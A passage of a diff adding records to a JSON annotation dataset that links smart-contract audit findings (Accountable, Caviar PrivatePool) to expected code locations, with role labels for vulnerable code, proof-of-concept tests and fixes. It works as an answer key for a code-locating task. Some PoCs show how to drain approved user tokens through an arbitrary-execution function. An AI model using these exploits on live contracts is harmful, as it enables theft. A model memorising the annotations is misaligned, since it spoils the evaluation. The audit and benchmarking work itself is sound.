+    "input_sha256": "2ab421f799fd94a51b50e049f7e34f6291ddd6ac936c388270cb28a300b1476a",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "One report groups four event gaps. Preserve report attribution; do not infer a single function.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4327,
+          "end_offset": 4437
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66891",
+    "input_sha256": "6b39a3a9ae61dfe832acf18b549d41f462086cfa3953acfcaf6e30e68771f9e7",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Comment correction; the report explicitly says code is correct.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1290,
+          "end_offset": 1400
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66890",
+    "input_sha256": "5499ca9a900e4777eafc2e02fd6a577a3e5462321f8315b5b8df21b56b3eeebe",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2526,
+          "end_offset": 2636
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66889",
+    "input_sha256": "b199695b89152444bcfb07c804d84803cbe6ba66b866695efead04822e0f9c6f",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1699,
+          "end_offset": 1809
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66888",
+    "input_sha256": "cbdb8bf3ae676623d62d58706480bdecc4fb546de52e3bb7b049b55ab7776356",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Operational/social-engineering finding; do not label as confirmed on-chain exploit.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1846,
+          "end_offset": 1956
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66887",
+    "input_sha256": "18d4c69f6efce3273c9e08ccb678e379b27cccea5f545c5a4e5bd4f2ad696670",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2001,
+          "end_offset": 2111
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-h-01-royalty-receiver-can-drain-a-private-pool",
+    "input_sha256": "f146a5155e02f395e3c738f30c799107b71726a962c9885a8d09c88936310e6d",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Third-party ERC2981/1024pixels examples are context, not the audited pool.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 237,
+        "end_line": 252,
+        "repo": "code-423n4/2023-04-caviar",
+        "ref": "main",
+        "path": "src/PrivatePool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 424,
+          "end_offset": 508
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/outdoteth/caviar-private-pools/pull/12",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 9743,
+          "end_offset": 9800
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "repo": "michaelliao/1024pixels",
+        "ref": "master",
+        "path": "contracts/1024pixels.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 7860,
+          "end_offset": 7938
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "        #buy(uint256[],uint256[],MerkleMultiProof)\n\n271:    if (payRoyalties) {\n            ...\n274:        (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n            ...\n278:        if (baseToken != address(0)) {\n279:            ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n280:        } else {\n281:            recipient.safeTransferETH(royaltyFee);\n282:        }\n",
+        "snippet_sha256": "e4c0dac28e1ca4c07ca495b2ff41d94f4bc4c684987a54355141ab8a78620a46",
+        "role": "vulnerable",
+        "role_basis": "FT royalty receiver of each token in PrivatePool.buy and PrivatePool.sell:\n\n[https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1451,
+          "end_offset": 1857
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 6,
+        "language_label": "solidity",
+        "snippet": "        // @audit An attacker can call this setter function between the two `_getRoyalty()` calls.\n94:     function _setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) internal virtual {\n95:         require(feeNumerator <= _feeDenominator(), \"ERC2981: royalty fee will exceed salePrice\");\n96:         require(receiver != address(0), \"ERC2981: Invalid parameters\");\n97:\n98:         _tokenRoyaltyInfo[tokenId] = RoyaltyInfo(receiver, feeNumerator);\n99:     }\n",
+        "snippet_sha256": "c4a9cf9f5cda229d6dcfa18c55cbb0e7b3bf62dc26ad6116391eb026e9bf2822",
+        "role": "context",
+        "role_basis": "ir `receive()` function.\n\n[https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 6120,
+          "end_offset": 6598
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/320",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-h-02-privatepool-owner-can-steal-all-erc20-and-nft-from-user-via-arbitrary-execution",
+    "input_sha256": "cad666ecfb057a51b83e7e288e9f863faccddb028a4e0bb61dc0b0a7a04cd8a0",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Block 3 is forge console output despite its Solidity fence; it is not Solidity source.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L648-L649",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 648,
+        "end_line": 649,
+        "repo": "code-423n4/2023-04-caviar",
+        "ref": "cd8a92667bcb6657f70657183769c244d04c015c",
+        "path": "src/PrivatePool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 8028,
+          "end_offset": 8148
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/outdoteth/caviar-private-pools/pull/2",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 5634,
+          "end_offset": 5690
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "/// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the\n/// pool. This allows for use cases such as claiming airdrops.\n/// @param target The address of the target contract.\n/// @param data The data to send to the target contract.\n/// @return returnData The return data of the transaction.\nfunction execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {\n\t// call the target with the value and data\n\t(bool success, bytes memory returnData) = target.call{value: msg.value}(data);\n\n\t// if the call succeeded return the return data\n\tif (success) return returnData;\n\n\t// if we got an error bubble up the error message\n\tif (returnData.length > 0) {\n\t\t// solhint-disable-next-line no-inline-assembly\n\t\tassembly {\n\t\t\tlet returnData_size := mload(returnData)\n\t\t\trevert(add(32, returnData), returnData_size)\n\t\t}\n\t} else {\n\t\trevert();\n\t}\n}\n",
+        "snippet_sha256": "97e2992814554e9b2dbe165ce37f326fc68b16512040165d5815da9ee4ce3d22",
+        "role": "vulnerable",
+        "role_basis": "-423n4/2023-04-caviar-findings/issues/29)\n\nIn the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2098,
+          "end_offset": 3023
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "contract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MTK\", 18) {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n}\n",
+        "snippet_sha256": "0f75ba34144e95e80d401c40211611bc5d4160fc89070d3501a05551e3bd85e5",
+        "role": "poc",
+        "role_basis": "eal funds via arbitrary execution.\n\nAfter user’s apporval, the target can be an ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.\n\nPlease add the code to Execute.t.sol so we can create a mock token:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3714,
+          "end_offset": 3882
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "  function testStealFundArbitrary_POC() public {\n        MyToken token = new MyToken();\n\n        address victim = vm.addr(1040341830);\n        address hacker = vm.addr(14141231201);\n\n        token.mint(victim, 100000 ether);\n\n        vm.prank(victim);\n        token.approve(address(privatePool), type(uint256).max);\n\n        console.log(\n            \"token balance of victim before hack\",\n            token.balanceOf(victim)\n        );\n\n        address target = address(token);\n        bytes memory data = abi.encodeWithSelector(\n            ERC20.transferFrom.selector,\n            victim,\n            hacker,\n            token.balanceOf(victim)\n        );\n\n        privatePool.execute(target, data);\n\n        console.log(\n            \"token balance of victim  after hack\",\n            token.balanceOf(victim)\n        );\n    }\n",
+        "snippet_sha256": "e453325feb0451584001d69fb9456f1197532d3a66f0c86e8c1893304aedf00b",
+        "role": "poc",
+        "role_basis": "reate a mock token:\n\n```solidity\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MTK\", 18) {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n}\n```\n\nPlease add the POC below to Execute.t.sol:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3943,
+          "end_offset": 4771
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 4,
+        "language_label": "solidity",
+        "snippet": "if (target == address(baseToken) || target == address(nft)) revert InvalidTarget();\n",
+        "snippet_sha256": "62f2743ce3df6299d901fd3b072cabaf979c89fe7e88d61c1953efe4ac1e3eff",
+        "role": "fix",
+        "role_basis": "roposed fix is to revert if execute tries to call the `baseToken` or `nft` contract. It’s very unlikely a user will approve any other token than these to the pool so this serves as a sufficient check to prevent the stealing outlined in the exploit.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 6018,
+          "end_offset": 6102
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "snippet",
+        "snippet_sha256": "7facf352313e981a04db2a864e6e170f85eb3456f0051b43ef9f62ce29a3c389",
+        "reason": "Console/transaction output is not Solidity source."
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/184",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-h-03-risk-of-silent-overflow-in-reserves-update",
+    "input_sha256": "5fa77d16bb0607cc0c6f90db220c55527b1f3c23168ada3f9024419e2a37bd7a",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 230,
+        "end_line": 231,
+        "repo": "code-423n4/2023-04-caviar",
+        "ref": "main",
+        "path": "src/PrivatePool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1999,
+          "end_offset": 2083
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/outdoteth/caviar-private-pools/pull/10",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 8025,
+          "end_offset": 8082
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "    function buy(uint256[] calldata tokenIds, uint256[] calldata tokenWeights, MerkleMultiProof calldata proof) \n        public\n        payable\n        returns (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount)\n    {\n        // ~~~ Checks ~~~ //\n\n        // calculate the sum of weights of the NFTs to buy\n        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n        // calculate the required net input amount and fee amount\n        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n        ...\n        // update the virtual reserves\n        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); \n        virtualNftReserves -= uint128(weightSum);\n        ...\n",
+        "snippet_sha256": "6cd772f66bc73f6396480f03039dcae095b581802a5965f915d9b78a536d00f8",
+        "role": "vulnerable",
+        "role_basis": "is means that casting to a lower type is necessary, but this casting is performed without first checking that the values being cast can fit into the lower type. As a result, there is a risk of a silent overflow occurring during the casting process.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3040,
+          "end_offset": 3805
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "    function test_Overflow() public {\n        // Setting up pool and base token HDT with high decimals number - 30\n        // Initial balance of pool - 10 NFT and 100_000_000 HDT\n        HighDecimalsToken baseToken = new HighDecimalsToken();\n        privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));\n        privatePool.initialize(\n            address(baseToken),\n            nft,\n            100_000_000 * 1e30,\n            10 * 1e18,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false\n        );\n\n        // Minting NFT on pool address\n        for (uint256 i = 100; i < 110; i++) {\n            milady.mint(address(privatePool), i);\n        }\n        // Adding 8 NFT ids into the buying array\n        for (uint256 i = 100; i < 108; i++) {\n            tokenIds.push(i);\n        }\n        // Saving K constant (xy) value before the trade\n        uint256 kBefore = uint256(privatePool.virtualBaseTokenReserves()) * uint256(privatePool.virtualNftReserves());\n\n        // Minting enough HDT tokens and approving them for pool address\n        (uint256 netInputAmount,, uint256 protocolFeeAmount) = privatePool.buyQuote(8 * 1e18);\n        deal(address(baseToken), address(this), netInputAmount);\n        baseToken.approve(address(privatePool), netInputAmount);\n\n        privatePool.buy(tokenIds, tokenWeights, proofs);\n\n        // Saving K constant (xy) value after the trade\n        uint256 kAfter = uint256(privatePool.virtualBaseTokenReserves()) * uint256(privatePool.virtualNftReserves());\n\n        // Checking that K constant succesfully was changed due to silent overflow\n        assertEq(kBefore, kAfter, \"K constant was changed\");\n    }\n",
+        "snippet_sha256": "2bab0d4a61a33984be576ae3270aa87c90a66d4e519c56a5e4004d46f776cdc5",
+        "role": "poc",
+        "role_basis": "ct price calculation, causing potential financial losses for users or pool owners.\n\n### Proof of Concept\n\nConsider the scenario with a base token that has high decimals number described in the next test (add it to the `test/PrivatePool/Buy.t.sol`):\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4243,
+          "end_offset": 5986
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "    contract HighDecimalsToken is ERC20 {\n        constructor() ERC20(\"High Decimals Token\", \"HDT\", 30) {}\n    }\n",
+        "snippet_sha256": "87826f11d4089a58b7441b6387258fab49597c2368f7c824993645c905335be1",
+        "role": "poc",
+        "role_basis": "ftReserves());\n\n        // Checking that K constant succesfully was changed due to silent overflow\n        assertEq(kBefore, kAfter, \"K constant was changed\");\n    }\n```\n\nAlso add this contract into the end of `Buy.t.sol` file for proper test work:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 6082,
+          "end_offset": 6195
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 3,
+        "language_label": "solidity",
+        "snippet": "File: PrivatePool.sol\n229:         // update the virtual reserves\n+            if (netInputAmount - feeAmount - protocolFeeAmount > type(uint128).max) revert Overflow();\n230:         virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); \n+            if (weightSum > type(uint128).max) revert Overflow();\n231:         virtualNftReserves -= uint128(weightSum);\n\nFile: PrivatePool.sol\n322:         // update the virtual reserves\n+            if (netOutputAmount + protocolFeeAmount + feeAmount > type(uint128).max) revert Overflow();\n323:         virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n+            if (weightSum > type(uint128).max) revert Overflow();\n324:         virtualNftReserves += uint128(weightSum);\n",
+        "snippet_sha256": "af6485fc362a5cd5d3cd2dba84072a1d1995298e8c15b1b4bbf123195953e739",
+        "role": "fix",
+        "role_basis": "\n```solidity\n    contract HighDecimalsToken is ERC20 {\n        constructor() ERC20(\"High Decimals Token\", \"HDT\", 30) {}\n    }\n```\n\n### Recommended Mitigation Steps\n\nAdd checks that the casting value is not greater than the `uint128` type max value:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 6331,
+          "end_offset": 7115
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/167",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-m-01-the-buy-functions-mechanism-enables-users-to-acquire-flash-loans-at-a-cheaper-fee-rate",
+    "input_sha256": "8eee7c9f78e380f5ec6802ceca8ccba4bd42c21087affa5fd9cc879919bd8fb3",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211-L289",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 211,
+        "end_line": 289,
+        "repo": "code-423n4/2023-04-caviar",
+        "ref": "main",
+        "path": "src/PrivatePool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 97,
+          "end_offset": 181
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "// @audit-info These are the default circumstances used by most of the tests:\n\nPrivatePool public privatePool;\n\naddress baseToken = address(shibaInu);\naddress nft = address(milady);\nuint128 virtualBaseTokenReserves = 100e6;\nuint128 virtualNftReserves = 10e18;\nuint16 feeRate = 1e2;\nuint56 changeFee = 3e6;\nbytes32 merkleRoot = bytes32(0);\naddress owner = address(this);\n\nuint256[] tokenIds;\nuint256[] tokenWeights;\nPrivatePool.MerkleMultiProof proofs;\nIStolenNftOracle.Message[] stolenNftProofs;\n\nfunction setUp() public {\n    privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));\n    privatePool.initialize(\n            baseToken, nft, virtualBaseTokenReserves, virtualNftReserves, changeFee, feeRate, merkleRoot, true, false\n    );\n    deal(address(shibaInu), address(this), 2e6);\n\n    // @audit-info Giving the pool 60 tokens to trade with\n    deal(address(shibaInu), address(privatePool), 100e6);\n\n    for (uint256 i = 0; i < 5; i++) {\n        milady.mint(address(privatePool), i + 1);\n    }\n    assertEq(milady.balanceOf(address(privatePool)), 5, \"Didn't mint 5 NFTs for some reason.\");\n}\n\nfunction test_failBecauseOfDivisionBy0() public {\n\n    for (uint256 i = 0; i < 5; i++) {\n        tokenIds.push(i + 1);\n    }\n\n    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.buyQuote(5e18);\n\n    shibaInu.approve(address(privatePool), netInputAmount);\n    // @audit-info Trying to buy the 5 tokens present in the pool\n    privatePool.buy(tokenIds, tokenWeights, proofs);\n}\n\nfunction onERC721Received(\n    address operator,\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n) external override returns (bytes4) {\n    // @audit-info Claim airdrop for the specific NFT here\n    airdrop.claim(tokenId);\n\n    // @audit-info Selling the NFT here\n    uint[] memory _tokenIds = new uint[](1);\n    _tokenIds[0] = tokenId;\n\n    milady.approve(address(privatePool), tokenId);\n    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.sellQuote(1e18);\n         \n    privatePool.sell(_tokenIds, tokenWeights, proofs, stolenNftProofs);\n    return bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"));\n}\n",
+        "snippet_sha256": "300b5636777dd51409124b66edf658c5b236075076de7aa9afd707390d1c0ae5",
+        "role": "poc",
+        "role_basis": "they do not necessitate upfront payment, unlike payable functions. Additionally, it requires the flash loan fee to be greater than the combined buy and sell fees for the NFTs.\n\nA proof-of-concept (PoC) demonstrating this scenario is provided below:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1199,
+          "end_offset": 3412
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/885",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-m-02-ethrouter-cant-perform-multiple-changes",
+    "input_sha256": "339883a0d3e2e2986c2d7b817c314df40213ff067da01eacf7185d425fb0cc59",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Blocks 0/1 are Solidity mislabeled js. Block 2 is a transaction trace.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/outdoteth/caviar-private-pools/pull/5",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4358,
+          "end_offset": 4414
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "js",
+        "snippet": "for (uint256 i = 0; i < changes.length; i++) {\n    Change memory _change = changes[i];\n\n    ...\n\n    // execute change\n    PrivatePool(_change.pool).change{value: msg.value}(\n        _change.inputTokenIds,\n        _change.inputTokenWeights,\n        _change.inputProof,\n        _change.stolenNftProofs,\n        _change.outputTokenIds,\n        _change.outputTokenWeights,\n        _change.outputProof\n    );\n",
+        "snippet_sha256": "d9d72a9d625ea8d425618db0ed1abf642b115cb86e48aa571db7540b4e31352a",
+        "role": "vulnerable",
+        "role_basis": "Rappie](https://github.com/code-423n4/2023-04-caviar-findings/issues/26)\n\nEthRouter is meant to support multiple changes in one tx, but that would fail.\n\n### Proof of Concept\n\nThe function `EthRouter.change` sends `msg.value` to pool in a for loop:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1290,
+          "end_offset": 1695
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "js",
+        "snippet": "    function test_twoChangesOneCall() public {\n    uint256[] memory inputTokenIds = new uint256[](1);\n    uint256[] memory inputTokenWeights = new uint256[](0);\n    uint256[] memory outputTokenIds = new uint256[](1);\n    uint256[] memory outputTokenWeights = new uint256[](0);\n\n    uint256[] memory inputTokenIds2 = new uint256[](1);\n    uint256[] memory inputTokenWeights2 = new uint256[](0);\n    uint256[] memory outputTokenIds2 = new uint256[](1);\n    uint256[] memory outputTokenWeights2 = new uint256[](0);\n\n    inputTokenIds[0] = 5;\n    outputTokenIds[0] = 0;\n\n    inputTokenIds2[0] = 6;\n    outputTokenIds2[0] = 1;\n\n    EthRouter.Change[] memory changes = new EthRouter.Change[](2);\n    changes[0] = EthRouter.Change({\n        pool: payable(address(privatePool)),\n        nft: address(milady),\n        inputTokenIds: inputTokenIds,\n        inputTokenWeights: inputTokenWeights,\n        inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n        stolenNftProofs: new IStolenNftOracle.Message[](0),\n        outputTokenIds: outputTokenIds,\n        outputTokenWeights: outputTokenWeights,\n        outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))\n    });\n\n    changes[1] = EthRouter.Change({\n        pool: payable(address(privatePool)),\n        nft: address(milady),\n        inputTokenIds: inputTokenIds2,\n        inputTokenWeights: inputTokenWeights2,\n        inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n        stolenNftProofs: new IStolenNftOracle.Message[](0),\n        outputTokenIds: outputTokenIds2,\n        outputTokenWeights: outputTokenWeights2,\n        outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))\n    });\n\n    (uint256 changeFee,) = privatePool.changeFeeQuote(inputTokenIds.length * 1e18);\n\n    //WARDEN: multiply with 10 just to make sure there really is enough\n    ethRouter.change{value: changeFee*10}(changes, 0);\n\n} \n",
+        "snippet_sha256": "fd58a964374cd86df3637fb98e66304fab6f54695e5de590a23f05e424897bd2",
+        "role": "poc",
